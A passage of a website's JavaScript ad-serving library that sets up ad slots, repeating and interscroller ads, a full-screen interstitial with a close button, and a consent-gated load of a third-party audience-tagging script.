            forcedSlotPosition.parentNode.insertBefore(forcedSlotDiv, forcedSlotPosition.nextSibling);
            break;
          case "prepend":
            forcedSlotPosition.insertBefore(forcedSlotDiv, forcedSlotPosition.firstChild);
            break;
          case "append":
          default:
            forcedSlotPosition.appendChild(forcedSlotDiv);
        }
      }
    } catch (err) {
      debug && console.error("%c[gmp]", "background: rgb(242, 148, 0); color: white", "error while setting up forced ad slot:", forcedAdSlot, ": ", err);
    }
  };
  /**
   * This method prepare the dom element populating the dataset values missing, and launch the setupSlot|setupRichMedia function
   * @param {Element} slot dom element
   */
  window._gmp.initCandidate = function (slot) {
    /**
     * Set up default values if absent from in-page divs
     */
    if (slot.id in window._gmp.slotMap) {
      debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "candidates: ", slot, slot.id, slot.id in window._gmp.slotMap);
      if (!window._gmp.isSlotToBeShown(slot)) {
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "not showing slot", slot.id, "to user of type", window._gmp.userType);
        return;
      }

      // should this ad-unit be displayed immediately
      var rightNow = 'immediate' in slot.dataset;
      if (
      // should this be present on devices of this type ?
      window._gmp.slotMap[slot.id].devices && (
      // if devices are not set, show everywhere

      window._gmp.mobile && window._gmp.slotMap[slot.id].devices.indexOf('mobile') < 0 || !window._gmp.mobile && window._gmp.slotMap[slot.id].devices.indexOf('desktop') < 0)) {
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "skipping ", slot.id, "- devices:", window._gmp.slotMap[slot.id].devices, "- mobile:", window._gmp.mobile);
        return;
      }
      if (
      // should this be present on pages of this type ?
      window._gmp.slotMap[slot.id].hasOwnProperty('pageType') && window._gmp.slotMap[slot.id].pageType.indexOf(window._gmp.pageType) == -1) {
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "skipping ", slot.id, "- not for this page type:", window._gmp.pageType);
        return;
      }

      /**
       * Fill-up missing info with defaults
       */
      if (!('adUnit' in slot.dataset) && 'unit' in window._gmp.slotMap[slot.id]) {
        slot.dataset.adUnit = window._gmp.slotMap[slot.id].unit;
      }
      if (window._gmp.slotMap[slot.id].hasOwnProperty('showToSubscribers') && window._gmp.slotMap[slot.id]['showToSubscribers']) {
        slot.dataset.showToSubscribers = '';
      }
      if (window._gmp.slotMap[slot.id].hasOwnProperty('native')) {
        slot.dataset.native = 1;
      } else {
        slot.dataset.native = 0;
      }
      if (window._gmp.slotMap[slot.id].hasOwnProperty('video')) {
        slot.dataset.video = 1;
      } else {
        slot.dataset.video = 0;
      }
      if (!('type' in slot.dataset) && window._gmp.slotMap[slot.id].hasOwnProperty('type')) {
        slot.dataset.type = window._gmp.slotMap[slot.id].type; // set type of ad slot
      }
      if (!('gamSizes' in slot.dataset) && 'gamSizes' in window._gmp.slotMap[slot.id]) {
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "setting up gamSizes:", window._gmp.slotMap[slot.id].gamSizes);
        slot.dataset.gamSizes = JSON.stringify(window._gmp.slotMap[slot.id].gamSizes);
      }
      if (!('pbSizes' in slot.dataset)) {
        if ('pbSizes' in window._gmp.slotMap[slot.id]) {
          slot.dataset.pbSizes = JSON.stringify(window._gmp.slotMap[slot.id].pbSizes);
        } else if ('gamSizes' in window._gmp.slotMap[slot.id]) {
          slot.dataset.pbSizes = JSON.stringify(window._gmp.slotMap[slot.id].gamSizes.filter(function (elem) {
            return Array.isArray(elem);
          })); // skip 'fluid'
        }
      }
      if ('bidderData' in window._gmp.slotMap[slot.id]) {
        slot.dataset.bidderData = JSON.stringify(window._gmp.slotMap[slot.id].bidderData); // set bidder data
      }
      if (!('apsSizes' in slot.dataset)) {
        if ('apsSizes' in window._gmp.slotMap[slot.id]) {
          slot.dataset.apsSizes = JSON.stringify(window._gmp.slotMap[slot.id].apsSizes);
        }
      }
      if (!('immediate' in slot.dataset) && 'immediate' in window._gmp.slotMap[slot.id] && window._gmp.slotMap[slot.id].immediate) {
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "Forcing immediate for", slot.id);
        slot.dataset.immediate = '';
        rightNow = true;
      }
      if (!('adUnit' in slot.dataset)) {
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "no adUnit for:", slot.id, " - setting up rich media slot (right now:", rightNow, ")");
        window._gmp.setupRichMediaSlot(slot, rightNow);
        return;
      }
    } else {
      debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "slot not in slotMap:", slot.id);
      // TODO: get info from ad unit, add an id if necessary and fill-in!!!!
      return;
    }
    window._gmp.setupSlot(slot, rightNow);
  };
  /**
   * Insert all 'forced' slots
   *
   * @todo support for repeating forced slots
   */
  for (var forcedAdSlot in window._gmp.slotMap) {
    window._gmp.forceAdSlot(forcedAdSlot);
  }
  window._gmp.setupPageAds = function () {
    /**
    * Fetch all candidate divs based on the appropriate class
    *
    * @todo: document.querySelectorAll(window._gmp.class + join degli id in slotmap, divisi da virgole);
    */
    var candidates = document.getElementsByClassName(window._gmp.class);
    if (candidates.length == 0) {
      debug && console.warn("%c[gmp]", "background: rgb(242, 148, 0); color: white", "no candidates for adv");
      // TODO: maybe report missing adv on page
      // TODO: maybe place units according to predefined logic
      return;
    }
    for (var i = 0; i < candidates.length; i++) {
      var slot = candidates[i];
      try {
        if (slot.id in window._gmp.slotMap && window._gmp.slotMap[slot.id].type in window._gmp.components && typeof window._gmp.components[slotMap[slot.id].type].init == 'function') {
          continue;
        }
        window._gmp.initCandidate(slot);
      } catch (err) {
        console.warn("%c[gmp]", "background: rgb(242, 148, 0); color: white", "error doing component init for slot:", slot, " - error: ", err);
      }
    }
    if (window._gmp.pageTypeConfig[window._gmp.pageType].intextAdSelector && window._gmp.userType != 'subscriber') {
      window._gmp.displayIntextAds();
    }
  };
  /**
  * All static ads are configured in page - run auctions
  */

  debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "flush auction");
  window._gmp.auctionQueue.flush();
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", window._gmp.setupPageAds);
  } else {
    window._gmp.setupPageAds();
  }
};

/**
 * Set up repeating slots for the page
 * @param {string} selector
 * @todo avoid removing pre-defined slots
 */
window._gmp.setUpRepeatingSlots = function (selector, adUnit) {
  if (!adUnit in window._gmp.unitMap) {
    window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "unit for repeating ads not present:", adUnit);
    return;
  }
  var repeatingSlots = window._gmp.repeatingSlots || {};
  var maxUnitHeight = Math.max.apply(null, window._gmp.unitMap[adUnit].gamSizes.map(function (elem) {
    return Array.isArray(elem) && Number.isInteger(elem[1]) ? elem[1] : 0;
  }));

  // document.querySelectorAll(selector + " div.gmp").forEach(function(elem) {
  //     window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "clearing repeating slot:", elem.id);
  //     elem.innerHTML = '';
  // });
  document.querySelectorAll(selector).forEach(function (elem, idx) {
    // if (idx % 2 && window._gmp.mobile) {
    //     window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "skipping odd repeating slot:", idx);
    //     return;
    // }
    if (elem.hasAttribute('data-gmp-repeating-done')) {
      window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "skipping repeating slot - already done:", elem);
      return;
    }
    elem.setAttribute('data-gmp-repeating-done', '');
    var slot_id = 'gmp-repeating-slot-' + window._gmp.slotCounter();
    elem.style.minHeight = maxUnitHeight + 'px';
    elem.style.width = "100%";
    elem.style.textAlign = "center";
    if (!(slot_id in window._gmp.gamSlots)) {
      window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "inserting repeating slot:", slot_id);
      repeatingSlots[slot_id] = window._gmp.insertSlot(adUnit, elem, 'append', slot_id);
      window._gmp.setupSlot(repeatingSlots[slot_id]);
    } else {
      window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "repeating slot already present - not inserting:", slot_id);
    }
  });
  return repeatingSlots;
};
if (window._gmp.pageTypeConfig[window._gmp.pageType].repeatingAdSelector && window._gmp.hasOwnProperty('repeatingAdUnit') && window._gmp.repeatingAdUnit) {
  document.addEventListener('gaminit', function () {
    var repeatingAdSelector = window._gmp.alternateRepeatingSelector ? window._gmp.alternateRepeatingSelector(window._gmp.pageTypeConfig[window._gmp.pageType].repeatingAdSelector) : window._gmp.pageTypeConfig[window._gmp.pageType].repeatingAdSelector;
    window._gmp.repeatingSlots = window._gmp.setUpRepeatingSlots(repeatingAdSelector, window._gmp.repeatingAdUnit);
  });
}

/**
 * Load new repeating slots in pageid
 * Let refresh of slots already in page be governed by the per-slot setting
 *
 * @todo add to gamSlots info on newly inserted divs
 */
window._gmp.reloadSlots = window._gmp.throttle(function () {
  var repeatingAdSelector = window._gmp.pageTypeConfig[window._gmp.pageType].repeatingAdSelector;
  var repeatingSlots = repeatingAdSelector ? window._gmp.setUpRepeatingSlots(repeatingAdSelector, window._gmp.repeatingAdUnit) : {};
}, window._gmp.reloadTimeout);

/**
 * Prepare for showing mobile skin
 */
try {
  if (window._gmp.mobile && typeof window._gmp.showMobileSkin == "function" && window._gmp.pageTypeConfig[window._gmp.pageType].mobileSkin && window._gmp.userType != 'subscriber') {
    if (window._gmp.gamInit) {
      window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "'gaminit already gone - showing mobile skin");
      window._gmp.showMobileSkin();
    } else {
      window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "adding 'gaminit' event listener for mobile skin");
      document.addEventListener('gaminit', function () {
        // TOOD: disable if window._gmp.disabledSlots && window._gmp.disabledSlots.includes(slotId)
        window._gmp.showMobileSkin();
      });
    }
  }
} catch (err) {
  window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "error while setting up mobile skin:", err);
}
document.addEventListener('consentGranted', function (evt) {
  if (!window._gmp.consentNeeded || evt.detail.purposes["1"]) {
    window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "loading P&G script");
    window._gmp.loadScript({
      provider: 'pandg',
      url: 'https://pghub.io/js/pandg-sdk.js',
      vendorId: 577,
      needsConsent: true
    }, function () {
      window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "P&G script loaded");
      if (typeof __tcfapi !== "undefined") {
        __tcfapi('getTCData', 2, function (tcData, success) {
          var metadata = {
            gdpr: 1,
            gdpr_consent: tcData.tcString,
            ccpa: null,
            bp_id: "adplay"
          };

          //required configuration parameters do not change
          var config = {
            name: "P&G",
            pixelUrl: "https://pandg.tapad.com/tag"
          };

          // initialize tag object
          console.log("[pandg] sending data:", metadata);
          var tagger = Tapad.init(metadata, config);

          // prepare object for passing custom data parameters
          // object can be empty if passing no custom data parameters
          // one or more additional parameters can be added - depending on availability
          if (typeof window._gmp.section !== 'undefined') {
            var data = {
              category: window._gmp.section
            };
            // for more information on firing the tag on custom events see the integration guide
            // fire tag sync when ready
            tagger.sync(data).then(console.log);
          }
        });
      } else {
        console.warn("[pandg] __tcfapi undefined");
      }
    });
  } else {
    window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "no purpose one consent - skipping P&G script");
  }
});

/**
 * set up interscroller adv
 */
window._gmp.components.interscroller = {
  hasObserver: true,
  preRender: function (slot) {
    var debug = window._gmp.debug;
    try {
      var interscroller_height = window._gmp.slotMap[slot.id].interscroller_height || 450;
      window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "setting up interscroller structure and css");

      //Creat a container and intescriller structure it near adslot
      var container = document.createElement('div');
      container.dataset.id = slot.id;
      var contentbg = document.createElement('div');
      var content = document.createElement('div');
      container.appendChild(content);
      content.appendChild(contentbg);
      slot.parentNode.insertBefore(container, slot);
      //move slot inside the structure
      contentbg.appendChild(slot);
      //setupClassList
      container.classList.add('rtbuzz_interscroller_container');
      content.classList.add('rtbuzz_interscroller_content');
      contentbg.classList.add('rtbuzz_interscroller_contentbg');
      container.style.height = interscroller_height + "px";
      content.style.height = interscroller_height + "px";
      contentbg.style.width = container.clientWidth + "px";
      contentbg.style.left = container.getBoundingClientRect().left + "px";
      window.addEventListener('resize', function () {
        contentbg.style.width = container.clientWidth + "px";
        contentbg.style.left = container.getBoundingClientRect().left + "px";
      });
      window.addEventListener('load', function () {
        contentbg.style.width = container.clientWidth + "px";
        contentbg.style.left = container.getBoundingClientRect().left + "px";
      });
      var label = document.createElement('div');
      label.classList.add('rtbuzz_interscroller_label');
      label.classList.add('rtbuzz_interscroller_up');
      var label2 = document.createElement('div');
      label2.classList.add('rtbuzz_interscroller_label');
      label2.classList.add('rtbuzz_interscroller_down');
      label.innerHTML = 'Advertisements';
      var img = document.createElement('img');
      img.width = 98;
      img.height = 18;
      img.src = 'data:image/png;charset=utf-8;base64,iVBORw0KGgoAAAANSUhEUgAAAGAAAAASCAYAAACkctvyAAAFe0lEQVRYhe2Ya2xVRRDHf/e2tFiKvBSNlYKGgIr4QsUXUlHESCogUtEYlSKoMfEV0A8YeRnUxBCMpGBINFrkoQYVIRKIr9YiRlvBCG1KkBaBQou8S6VS1g8zm7Pde257b6npB/knJ7s7O7tnZmdndnYBngeqgYGcRTiWlsFpA5NmtPvUUWAUkA0MSXJsN2A00KO9hfq/YSCQD2QkOW4oYICR7S5Rx+N84HvgzpTLroUfGmC3gSXFEIkAvAR82qESAjcgBsjpYDn+C/RDdJvCV9thl4H1R6DewOzFAJ9r/xkjCtwILCfwgGnAE0BXYKf+6CTNF3oFsFbri4AaYIrTP0RpRr9Z3n/vA2ZqfY3Dl6W0OQ6tBjG2j3kOTyVwhdM3DHhT6+85fJanN/CTQ/8EiDjjTwNw0x3HGdR/FtWNtaSnbGYnJxiZNyya0aWCWANcjZylds55Xv8o4A2tL1eegwAPasPG8g+AJp2sFJgN7FCe/sqzAqhVWjnNDZCj9J3AAuBLba9xhHlKaft0nmXanw68pX2rgfmOUsOd8Z85PO+oIga4TvvHAUeBrcBxVXgdkKl6GqAeWAwUarsK6KzjswHD0LsmUmlWUnLSUFRv2GwMGw5MiGZ2m4k1kuBmR5+3CTzka4dnMvC3rtcxYJXKFWOABdqe4wxOU9oCh2ZDkLswAJuBPz3ao8p7i7YfJtYoAD2V/rJHrwG2aP0q5Xnc4zkJFGs9R3l+JRZ2cdIc2uVKs2lONmAi1+fkUWGWsbFRDLDFGNbtnxDNyPQNUIVsJBfjdM7R2r5f2xtcpmiIgBdq6RqgEShC3MgiRUvXdXsirljgzfkhskBjtW3D3aseX1ctyz36XKBC6w85c7ooIDCwxXRiMQbxoEaHVo6EMSvfaX9QK+gLLPFoq7V8QEur8yyXKcwA3YA9wCmPvhc4rxVBztXyUEjfMaCP1q2r7/V4qpW2CrjEoRcAE7XeW0t/keYCt2u9l5a/eDzpWh4Ike+oMy4ZA6Rquc2jNyFraOfsouVvYYN9NCUhgAtrtClIJtEDUaYBMd4+jz9M0RwkdPyBnCP5wHe0nnUcBEq0bhfa30S2nUYsUhEvheZe3RpO6bhpwGBE50b9RypBaLJzNtM5ngGSEcCFXaTBSDjppHOlInGyKIH/bEcOy6eB14Bvkd11K3A4SXnaqkeyaACuQXZ5J4LIUoncJ+LKFM8AicBO5O7MTlo+i2QYZ4JF+g1HPOALrfu72qIzcn5VEd+D7bkVNkcTbVuPVKA7kmgUtsAXuhnCzoBEYZVIcWgntDwnhH8hQRYVL8beBnxEEEJAdtBjBPF9T5yxLyIhCyTFDIM9eLuE9KUThKBkYNehT0jfu0haCnF0PhMD1Gk5wKHVKn2cx9sbeAb4R9vxQkMDkqKO8ehdnbpNXf30dzLi8hC+ASxKgREeLQO4EvhG2ykkhyOI3C6ygKkExk7YA6IJClCFvIcsAt4H8pQ+FbmJrgXGIztzP/AX8IryWFf3hSpF8vSVSFZzD3IOLNR/AJQBm5CwNEP/8TNwKfKyiyN/mH7TCW7CuUhau0P75jdnjURkDv/8j1nLScAg5IwbD7wA7EY88TlPlhiZcoAfkYMP4HX0huZhBpIeukgjuNiUOPQnCa7kBkm9sp3+sciFLd5Lqp3Tfh97/ZkEmZH9HnH6RyCLEe+B8V5vbB2SOFjITXjY3XnsMkspajAU1Z+izBg2HRkf7dHdv4iBeKA75++ezrnARlr2znZFFLiA8HibCDKR8NbS+Ezk5bItiCAXqItC+voBJqXXxflsbYIKk836w1kcMn0pLAbZEGFpcRTxrrbqfBaKLOTdJo/cSbDFwDYD6+tIzR4AkuHtaHGGBPEv52aH4jPeD7QAAAAASUVORK5CYII=';
      label2.appendChild(img);
      content.parentNode.insertBefore(label, content);
      content.parentNode.insertBefore(label2, content.nextSibling);
      if (!window._gmp.components.interscroller.cssAlready && 'IntersectionObserver' in window) {
        // Activate intersection observer when the observed element
        // has even one pixel within 150px of the viewport for interscroller
        var iOptions = {
          root: null,
          rootMargin: '0px 0px 200px 0px',
          threshold: 0
        };
        window._gmp.components.interscroller.adObserver = new IntersectionObserver(window._gmp.components.interscroller.ioCallback, iOptions);
        // window._gmp.components.interscroller.refreshObserver = new IntersectionObserver(refreshCallback, iOptions); // TODO: adapt ioCallback for use also in refreshObserver
      }
      if (window._gmp.components.interscroller.adObserver) {
        window.addEventListener('gmp-ready-to-observe-interscroller', function (e) {
          var c = e.detail.slot;
          if (c === slot.id) {
            debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "setting up interscroller observer for:", container);
            window._gmp.components.interscroller.adObserver.observe(container);
          }
        });
      }
      window._gmp.components.interscroller.addHeadCSS();
    } catch (err) {
      debug && console.error("%c[gmp]", "background: rgb(242, 148, 0); color: white", "error while preRender interscroller ad slot :", slot, ": ", err);
    }
  },
  adObserver: false,
  ioCallback: function (entries, observer) {
    var debug = window._gmp.debug;
    entries.forEach(function (entry) {
      if (entry.isIntersecting) {
        var delayedAdvId = entry.target.dataset.id;
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "entry intersecting:", delayedAdvId);
        if (delayedAdvId in window._gmp.delayedGAMSlots) {
          var delayedSlot = window._gmp.delayedGAMSlots[delayedAdvId];
          debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "GAM delayed invocation for:", delayedAdvId);
          window._gmp.requestBids(delayedSlot);
        }
        observer.unobserve(entry.target);
      }
    });
  },
  renderEnded: function (slot, event) {
    if (!event.isEmpty) {
      var interscroller_height = window._gmp.slotMap[slot.id].interscroller_height || 400;
      var contentbg = slot.parentNode;
      var content = contentbg.parentNode;
      var container = content.parentNode;
      var maxWidt = container.clientWidth;
      contentbg.style.width = maxWidt + "px";
      contentbg.style.left = container.getBoundingClientRect().left + "px";
      //TODO aggiungere calcoli per la determina della scala
      var advWidth = Math.max(slot.getElementsByTagName('iframe')[0].width, slot.getElementsByTagName('iframe')[0].clientWidth);
      var advHeight = Math.max(slot.getElementsByTagName('iframe')[0].height, slot.getElementsByTagName('iframe')[0].clientHeight);
      var scale = Math.min(maxWidt / advWidth, window.innerHeight / advHeight);
      if (scale < 1) {
        slot.style.transform = 'scale(' + scale + ')';
        slot.style.transformOrigin = '50% 50%';
      } else {
        var newScale = interscroller_height / advHeight;
        if (newScale > 1 && advWidth * newScale < maxWidt) {
          slot.style.transform = 'scale(' + scale + ')';
          slot.style.transformOrigin = '50% 50%';
        }
      }
    }
  },
  cssAlready: false,
  addHeadCSS: function () {
    if (!window._gmp.components.interscroller.cssAlready) {
      //insert css style tag in the head
      var head = document.getElementsByTagName('head')[0];
      var style = document.createElement('style');
      style.innerHTML = window._gmp.components.interscroller.HeadCSS;
      head.appendChild(style);
      window._gmp.components.interscroller.cssAlready = true;
    }
  },
  HeadCSS: `
    .rtbuzz_interscroller_container {
        position: relative;
        /*overflow:hidden;*/
        z-index: 1000;
        width: 100%;
        margin: 25px 0 30px !important;
        box-shadow: 0px 0px 11px #262626;
        box-shadow: 0px 10px 11px -10px #262626, 0px -10px 11px -10px #262626;
    }

    .rtbuzz_interscroller_container .rtbuzz_interscroller_content {
            position: absolute;
            left: 0;
            top: 0;
            width: 100%;
            overflow: visible;
            visibility: visible;
            background: transparent;
            clip: rect(auto auto auto auto);
            box-sizing: content-box;
    }
    .rtbuzz_interscroller_container .rtbuzz_interscroller_content .rtbuzz_interscroller_contentbg {
                position: fixed;
                width: 100vw;
                height: 100vh;
                text-align: center;
                display: flex;
                align-items: center;
                justify-content: center;
                transform: translateZ(0);
                top: 0;
                left: 0;
                background: rgb(255, 255, 255);
                background: radial-gradient(circle, rgba(255, 255, 255, 1) 0%, rgba(255, 255, 255, 1) 80%, rgba(190, 190, 190, 1) 100%);
    }
    .rtbuzz_interscroller_container .rtbuzz_interscroller_content .rtbuzz_interscroller_contentbg iframe {
                    max-width: unset;
    }




    .rtbuzz_interscroller_label {
        color: #585858;
        font-family: Helvetica, Arial, sans-serif !important;
        font-size: 9.5px !important;
        font-weight: 300 !important;
        /* height: 18px!important; */
        letter-spacing: .3px !important;
        line-height: 18px !important;
        margin: 0 !important;
        text-align: center !important;
        text-transform: uppercase !important;
        z-index: 2;
        position: absolute;
        left: 0;
        width: 100%;
        height: 18px;
    }
    .rtbuzz_interscroller_label.rtbuzz_interscroller_up {
            top: -18px;
        }

    .rtbuzz_interscroller_label.rtbuzz_interscroller_down {
            bottom: -24px;
        }

    .rtbuzz_interscroller_label img {
            width: 98px !important;
            height: 18px !important;
            float: none;
            padding: 0;
            border: none;
            margin: 0;
            display: inline-block;
            border: none !important;
    }`
};

/**
 * set up intropage adv
*/
window._gmp.components.intropage = {
  singleton: true,
  startWhenClosed: function (slotId, callback) {
    var debug = window._gmp.debug;
    if (!(slotId in window._gmp.slotMap)) {
      debug && console.log("%c[gmp][intropage]", "background: rgb(242, 148, 0); color: white", "the slot not exist");
      callback();
      return;
    }
    if (window._gmp.slotMap[slotId].type != "intropage") {
      debug && console.log("%c[gmp][intropage]", "background: rgb(242, 148, 0); color: white", "the slot is not an intropage");
      callback();
      return;
    }
    if (window._gmp.slotMap[slotId].hasOwnProperty('refreshInterval')) {
      debug && console.log("%c[gmp][intropage]", "background: rgb(242, 148, 0); color: white", "the slot is refreshable the callback will never be performed");
      return;
    }
    var slot = document.getElementById(slotId);
    if (slot != null && slot.dataset.closeDone > 0) {
      debug && console.log("%c[gmp][intropage]", "background: rgb(242, 148, 0); color: white", "the intropage is already closed 1");
      callback();
      return;
    }
    if (slot == null && window._gmp.slotMap[slotId].force === false) {
      debug && console.log("%c[gmp][intropage]", "background: rgb(242, 148, 0); color: white", "the intropage is already closed 2");
      callback();
      return;
    }
    var intropageClose = function (event) {
      if (event.detail.slot == slotId) {
        debug && console.log("%c[gmp][intropage]", "background: rgb(242, 148, 0); color: white", "the intropage is closed");
        window.removeEventListener('rtbuzz_interstitial_close', intropageClose);
        callback();
      }
    };
    window.addEventListener('rtbuzz_interstitial_close', intropageClose);
  },
  preRender: function (slot) {
    var debug = window._gmp.debug;
    try {
      debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "setting up interstitial structure and css");
      // remove out of screen sizes
      var adAreaWidth = screen.width;
      var adAreaHeight = screen.height - 30;
      var gamSizes = [];
      var pbSizes = [];
      var apsSizes = [];
      slot.dataset.closeDone = 0;
      if (window._gmp.slotMap[slot.id].hasOwnProperty('gamSizes')) {
        window._gmp.slotMap[slot.id].gamSizes.forEach(element => {
          if (element[0] < adAreaWidth && element[1] < adAreaHeight || element == "fluid") {
            gamSizes.push(element);
          }
        });
        slot.dataset.gamSizes = JSON.stringify(gamSizes);
        if (window._gmp.slotMap[slot.id].hasOwnProperty('pbSizes')) {
          window._gmp.slotMap[slot.id].pbSizes.forEach(element => {
            if (element[0] < adAreaWidth && element[1] < adAreaHeight) {
              pbSizes.push(element);
            }
          });
          slot.dataset.pbSizes = JSON.stringify(pbSizes);
        } else {
          slot.dataset.pbSizes = JSON.stringify(gamSizes.filter(function (elem) {
            return Array.isArray(elem);
          })); // skip 'fluid'
        }
        if (window._gmp.slotMap[slot.id].hasOwnProperty('apsSizes')) {
          window._gmp.slotMap[slot.id].apsSizes.forEach(element => {
            if (element[0] < adAreaWidth && element[1] < adAreaHeight) {
              apsSizes.push(element);
            }
          });
          slot.dataset.apsSizes = JSON.stringify(apsSizes);
        }
      }

      //Creat a container and place it near adslot
      var container = document.createElement('div');
      slot.parentNode.insertBefore(container, slot);
      //move slot inside the container
      container.appendChild(slot);
      container.classList.add('rtbuzz_interstitial_container');
      //createClosebutton
      var interstitialClose = document.createElement('a');
      interstitialClose.classList.add('rtbuzz_interstitial_close');
      interstitialClose.innerHTML = 'X';
      container.dataset.clsbl = 0;
      slot.classList.add('rtbuzz_interstitial_content');
      container.appendChild(interstitialClose);
      // setup close function
      interstitialClose.onclick = function () {
        //nascondi
        if (container.dataset.clsbl == 1) {
          container.dataset.clsbl = 0;
          slot.dataset.closeDone = 1;
          container.classList.remove('rtbuzz_interstitial_visible');
          window._gmp.components.intropage.renderClose(slot);
        }
        // set Interstitial css
      };
      window._gmp.components.intropage.addHeadCSS();
    } catch (err) {
      debug && console.error("%c[gmp]", "background: rgb(242, 148, 0); color: white", "error while preRender interistitial ad slot :", slot, ": ", err);
    }
  },
  impressionViewable: function (slot, event) {
    var container = slot.parentNode;
    container.classList.add('rtbuzz_interstitial_clsbl');
    container.dataset.clsbl = 1;
  },
  renderEnded: function (slot, event) {
    slot.dataset.auctionDone = 1;
    if (!event.isEmpty) {
      var container = slot.parentNode;
      container.classList.add('rtbuzz_interstitial_visible');
      container.classList.remove('rtbuzz_interstitial_clsbl');
      container.dataset.clsbl = 0;
      setTimeout(function () {
        container.dataset.clsbl = 1;
        container.classList.add('rtbuzz_interstitial_clsbl');
      }, 6000);
      const config = {
        attributes: false,
        childList: true,
        subtree: false
      };
      const getStyle = function (x, styleProp) {
        if (window.getComputedStyle) {
          var y = document.defaultView.getComputedStyle(x, null).getPropertyValue(styleProp);
        } else if (x.currentStyle) {
          var y = x.currentStyle[styleProp];
        }
        return y;
      };
      // Callback function to execute when mutations are observed
      const callback = function (mutationList, observer) {
        // Use traditional 'for loops' for IE 11
        for (const mutation of mutationList) {
          if (mutation.type === 'childList') {
            for (const n of mutation.addedNodes) {
              if (n.nodeType == Node.ELEMENT_NODE) {
                var zBLuff = getStyle(n, 'z-index');
                if (!isNaN(zBLuff) && zBLuff >= 16777271 && n.className.indexOf('qc-cmp') === -1) {
                  n.style.zIndex = 16000000;
                } else {
                  var childs = n.getElementsByTagName("*");
                  for (let c of childs) {
                    if (c.nodeType == Node.ELEMENT_NODE) {
                      var zBLuff2 = getStyle(c, 'z-index');
                      if (!isNaN(zBLuff2) && zBLuff2 >= 16777271 && c.className.indexOf('qc-cmp') === -1) {
                        c.style.zIndex = 16000000;
                      }
                    }
                  }
                  ;
                }
              }
            }
          }
        }
      };

      //check the node already prensent to check if someone go over interstitial
      for (const n of document.body.childNodes) {
        if (n.nodeType == Node.ELEMENT_NODE && n !== container) {
          var zBLuff = getStyle(n, 'z-index');
          if (!isNaN(zBLuff) && zBLuff >= 16777271) {
            n.style.zIndex = 16000000;
          } else {
            var childs = n.getElementsByTagName("*");
            for (let c of childs) {
              if (c.nodeType == Node.ELEMENT_NODE && c !== container) {
                var zBLuff2 = getStyle(c, 'z-index');
                if (!isNaN(zBLuff2) && zBLuff2 >= 16777271) {
                  c.style.zIndex = 16000000;
                }
              }
            }
            ;
          }
        }
      }
      // Create an observer instance linked to the callback function
      const observer = new MutationObserver(callback);
      // Start observing the target node for configured mutations
      observer.observe(document.body, config);
      window.addEventListener('rtbuzz_interstitial_close', function (e) {
        var c = e.detail.slot;
        if (c === slot.id) {
          observer.disconnect();
        }
      });
    }
  },
  renderClose: function (slot) {
    var debug = window._gmp.debug;
    slot.dataset.closeDone = 1;
    window.dispatchEvent(new CustomEvent('rtbuzz_interstitial_close', {
      detail: {
        slot: slot.id
      },
      bubbles: false,
      cancelable: false,
      composed: false
    }));
    if (window._gmp.slotMap[slot.id].hasOwnProperty('onCloseAdSlots')) {
      window._gmp.setupFallbackAdSlots(window._gmp.slotMap[slot.id].onCloseAdSlots, false);
    }
  },
  cssAlready: false,
  addHeadCSS: function () {
    if (!window._gmp.components.intropage.cssAlready) {
      //insert css style tag in the head
      var head = document.getElementsByTagName('head')[0];
      var style = document.createElement('style');
      style.innerHTML = window._gmp.components.intropage.headCSS;
      head.appendChild(style);
      window._gmp.components.intropage.cssAlready = true;
    }
  },
  headCSS: `
    @keyframes spin2 {
        0% {transform:rotate(0deg);border:5px solid #fff; border-top:5px solid #ccc;}
        25%  {transform:rotate(90deg);border:5px solid #fff; border-right:5px solid #bbb;}
        50%  {transform:rotate(180deg);border:5px solid #fff; border-bottom:5px solid #ccc;}
        75%  {transform:rotate(270deg);border:5px solid #fff; border-left:5px solid #ddd;}
        100% {transform:rotate(360deg);border:5px solid #fff; border-top:5px solid #ccc;}
      }
      @keyframes count{
          0%   {content:"5";}
          25%  {content: "4";}
          50%  {content: "3";}
          75%  {content: "2";}
          100% {content: "1";}
      }
    .rtbuzz_interstitial_container {
        position: fixed;
        width: 100vw;
        height: 100vh;
        left: 0px;
        top: 0px;
        z-index: 2147483646;
        background-color: rgba(0, 0, 0, 0.8);
        display: none;
        visibility: hidden;
    }
    .rtbuzz_interstitial_container.rtbuzz_interstitial_visible {
        visibility: visible;
        display: table;
    }
      .rtbuzz_interstitial_container .rtbuzz_interstitial_close, .rtbuzz_interstitial_container .rtbuzz_interstitial_close:hover {
          font-family: sans-serif;
          font-size: 17px;
          font-weight: 700;
          padding: 0px;
          position: absolute;
          right: 25px;
          text-align: center;
          top: 25px;
          width: 40px;
          height: 40px;
          line-height: 30px;
